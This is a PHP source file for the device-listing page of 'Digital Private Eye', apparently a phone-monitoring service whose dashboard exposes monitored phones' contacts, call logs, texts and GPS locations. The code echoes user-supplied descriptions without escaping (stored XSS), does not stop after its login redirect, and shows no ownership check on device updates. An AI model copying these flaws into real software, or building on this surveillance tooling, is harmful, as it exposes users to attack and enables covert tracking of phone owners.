<?php
session_start();
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = 'https://play.google.com/store/apps/details?id=com.ghostservice';
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";

$userId = null;
if(array_key_exists("user_id", $_SESSION)) $userId = $_SESSION['user_id'];
if(!$userId) header("Location: sign-in.php");

include("logic/Devices.php");

$devicesModel = new Devices();
if($_POST)
{
    $newDeviceDescription = trim($_POST['deviceDescription']);
    $device = $_POST['device'];
    $updateStatus = $devicesModel->updateDeviceDescription($newDeviceDescription, $device);
}
$devices = $devicesModel->getDevices();

$readonly = "";
if($_SESSION['user_id']=='1') $readonly = "readonly";
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Devices - <?=APPLICATION_NAME;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
    <!--[if IE 7]>
      <link rel="stylesheet" href="css/font-awesome-ie7.min.css">
    <![endif]-->
    <link rel="stylesheet" type="text/css" href="css/style.css" />

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Fav &amp; touch icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/sample/logo-144.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/sample/logo-114.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/sample/logo-72.png">
                    <link rel="apple-touch-icon-precomposed" href="img/sample/logo-57.png">
                                   <link rel="shortcut icon" href="img/sample/logo.png">
    
  </head>

  <body>


  <?php
  include "nav.php";
  ?>
    
    <div class="clear"></div>
    
    <div class="container-wrapper container-top">
      <div class="container container-top">
        <div class="row">
          <div class="col-md-12 center">
            <h1>Devices</h1>
          </div>
        </div><!-- end row -->
      </div><!-- end container -->
    </div><!-- end container wrapper -->
    
    <div class="container">
      <div class="row">
        <div class="col-md-3 bs-docs-nav-wrapper">
          <ul class="nav nav-pills nav-stacked bs-docs-nav" data-spy="affix" data-offset-top="250" data-offset-bottom="350">
              <?php
                foreach($devices as $device)
                {
                    $deviceName = $device['deviceId'];
                    if($device['description']!= "Unlabelled Device") $deviceName = $device['description'];
                    echo "<li><a href=\"#".$deviceName."\" class=\"list-group-item\">".$deviceName."</a></li>";
                }
              ?>
          </ul>
        </div>
        <div class="col-md-8 col-md-offset-1">

            <?php
                if(!$devices) echo "You have no devices currently registered for monitoring.";
                foreach($devices as $device)
                {
                    $deviceName = $device['deviceId'];
                    $deviceId = $device['deviceId'];
                    if($device['description']!= "Unlabelled Device") $deviceName = $device['description'];
                    $description = $device['description'];
                    $createdDate = $device['created_date'];
                    $expiryDate = $device['expiry_date'];
                    //If date epoch length is less than 13 digits long its usually 10 digits long so add '000' to add miliseconds elapsed
                    if(strlen($createdDate)<13) $createdDate = $createdDate."000";
                    if(strlen($expiryDate)<13) $expiryDate = $expiryDate."000";
                    if(!$description) $description = "To be edited";

                    echo "<div id=\"".$deviceName."\">
                        <h2>Device ID: ". $device['deviceId'] ."</h2></br>
                        <h2>($description)</h2>
                        <p> Registration Date:
                            <script>
                                var localTime = new Date($createdDate);
                                document.write(localTime.toString());
                            </script>
                         </br>
                        Expiry Date:
                            <script>
                                var localTime = new Date($expiryDate);
                                document.write(localTime.toString());
                            </script>
                        </br>
                        Device Status: ". ($device['status'] ? "active" : "inactive")."</p>
                        <form  id='editDeviceDescriptionForm$deviceId'  action=\"\" method=\"post\" style='width:100%'>
                            Edit Description: <input type=\"text\" name=\"deviceDescription\" value=\"$description\" ".$readonly.">&nbsp
                            <a id='submitbutton'
                                href=\"javascript: submitform('$deviceId')\"><button type=\"submit\" class=\"btn btn-sm btn-green\">Edit</button></a>
                            <br>
                            <input type=\"hidden\" name=\"device\" value=\"$deviceId\">

                            <br>
                            <br>
                        </form>

                        <div>
                            <table>
                                <tr>
                                <td ><a
                                    href='device-contacts.php?device=$deviceId' onclick='showLoadingDiv()'><button type=\"submit\" class=\"btn btn-md btn-purple\">Contacts</button></a></td>
                                    <td ><a
                                    href='device-call-logs.php?device=$deviceId' onclick='showLoadingDiv()'><button type=\"submit\" class=\"btn btn-md btn-purple\">Call Logs</button></a></td>
                                    <td ><a
                                    href='device-texts.php?device=$deviceId' onclick='showLoadingDiv()'><button type=\"submit\" class=\"btn btn-md btn-purple\">Text Messages</button></a></td>
                                    <td ><a
                                    href='device-locations.php?device=$deviceId' onclick='showLoadingDiv()'><button type=\"submit\" class=\"btn btn-md btn-purple\">Gps Locations</button></a></td>
                                </tr>
                            </table> <hr />
                        </div>
                          </div>
";
                }
              ?>

        </div>
      </div><!-- end row -->
    </div><!-- end container -->

    <div class="clear"></div>


    <?php
    include "footer.php";
    ?>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/zion.js"></script>
    <script type="text/javascript">
      
        $(document).ready(function(){
          $("body").scrollspy({target: ".bs-docs-nav-wrapper", offset:50});
        });
      
    </script>

  </body>
</html>
